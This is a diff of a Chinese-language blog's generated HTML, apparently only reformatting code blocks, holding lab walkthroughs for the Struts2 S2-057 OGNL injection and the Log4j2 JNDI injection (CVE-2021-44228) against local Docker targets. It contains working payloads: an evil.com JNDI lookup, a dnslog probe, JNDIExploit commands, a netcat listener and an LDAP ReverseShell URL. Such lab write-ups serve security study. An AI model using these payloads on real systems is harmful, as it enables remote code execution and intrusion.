@@ -11,10 +11,10 @@
 <p>3.影响版本:&lt;&#x3D;Struts 2.3.34，Struts 2.5.16</p>
 <p>比较鸡肋</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220812121132495.png" alt="image-20220812121132495"></p>
-<h5 id="2-访问靶场"><a href="#2-访问靶场" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.129.130:8080/showcase/</span><br></pre></td></tr></table></figure>
+<h5 id="2-访问靶场"><a href="#2-访问靶场" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs url">http://192.168.129.130:8080/showcase/<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220812122212011.png" alt="image-20220812122212011"></p>
 <h5 id="3-漏洞测试"><a href="#3-漏洞测试" class="headerlink" title="3.漏洞测试"></a>3.漏洞测试</h5><p>测试OGNL表达式<code>$&#123;1+1&#125;</code>：</p>
@@ -22,11 +22,11 @@
 <p><img src="/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-08-12%20123118.png" alt="屏幕截图 2022-08-12 123118"></p>
 <p>可以看到1+1的结果已在Location标头中返回</p>
 <h5 id="4-使用exp"><a href="#4-使用exp" class="headerlink" title="4.使用exp"></a>4.使用exp</h5><p>尝试了很多exp，大多需要python2环境，还是这个好用，需要私聊</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python struts2-057_cmd.py http://192.168.129.130:8080 id</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python struts2-057_cmd.py http://192.168.129.130:8080 id<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220812143004981.png" alt="image-20220812143004981"></p>
 <p>成功执行命令 </p>
-<h5 id="5-关闭环境"><a href="#5-关闭环境" class="headerlink" title="5.关闭环境"></a>5.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose down --rmi all -v</span><br></pre></td></tr></table></figure>
+<h5 id="5-关闭环境"><a href="#5-关闭环境" class="headerlink" title="5.关闭环境"></a>5.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/12/CVE-2018-11776%EF%BC%88Struts2%20S2-057%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/image-20220812194854924.png" alt="image-20220812194854924"></p>
 <p>关闭并删除环境</p>
@@ -46,26 +46,26 @@
 <p>JNDIExploit.v1.2：链接: <a href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao </p>
 <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose up -d<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810113257176-1660185235187.png" alt="image-20220810113257176-1660185235187"></p>
 <h5 id="2-漏洞测试"><a href="#2-漏洞测试" class="headerlink" title="2.漏洞测试"></a>2.漏洞测试</h5><p>在<a href="http://dnslog.cn/%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%9A%84%E5%9F%9F%E5%90%8D">http://dnslog.cn/获取一个测试的域名</a></p>
 <p>构造数据包dnslog测试</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.931p5u.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs url">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.931p5u.dnslog.cn&#125;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115554880.png" alt="image-20220810115554880"></p>
 <p>存在漏洞</p>
 <h5 id="3-中转机vps环境构建"><a href="#3-中转机vps环境构建" class="headerlink" title="3.中转机vps环境构建"></a>3.中转机vps环境构建</h5><p>使用工具exp:Log4j-exp</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.129.128</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.129.128<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112602168.png" alt="image-20220810112602168"></p>
-<h5 id="4-启动监听"><a href="#4-启动监听" class="headerlink" title="4.启动监听"></a>4.启动监听</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+<h5 id="4-启动监听"><a href="#4-启动监听" class="headerlink" title="4.启动监听"></a>4.启动监听</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -lnvp 1234<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112520706-1660198332069.png" alt="image-20220810112520706"></p>
-<h5 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.129.130:1389/Basic/ReverseShell/192.168.128.130/1234&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.129.130:1389/Basic/ReverseShell/192.168.128.130/1234&#125;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112302254-1660183567356.png" alt="image-20220810112302254-1660183567356"></p>
-<h5 id="6-关闭环境"><a href="#6-关闭环境" class="headerlink" title="6.关闭环境"></a>6.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose down --rmi all -v</span><br></pre></td></tr></table></figure>
+<h5 id="6-关闭环境"><a href="#6-关闭环境" class="headerlink" title="6.关闭环境"></a>6.关闭环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker-compose down --rmi all -v<br></code></pre></td></tr></table></figure>
 
 <p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115216079.png" alt="image-20220810115216079"></p>
 ]]></content>
